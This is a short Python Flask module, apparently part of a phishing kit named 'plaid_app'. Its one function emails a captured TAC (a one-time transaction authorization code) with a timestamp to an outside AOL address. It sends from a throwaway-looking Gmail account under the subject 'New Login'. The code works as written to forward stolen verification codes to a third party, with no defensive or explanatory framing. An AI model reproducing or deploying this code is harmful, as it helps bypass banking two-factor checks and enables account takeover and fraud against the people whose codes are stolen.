from plaid_app import mail
from flask_mail import Message
from datetime import datetime

def tac_code(tac):
    msg = Message('New Login',
        sender='applefreeiphone34882@gmail.com',
        recipients=['n_malaysia@aol.com'])
    msg.body=f'''
    TAC ----- {tac}
    at ---- {datetime.now()}
    '''
    mail.send(msg)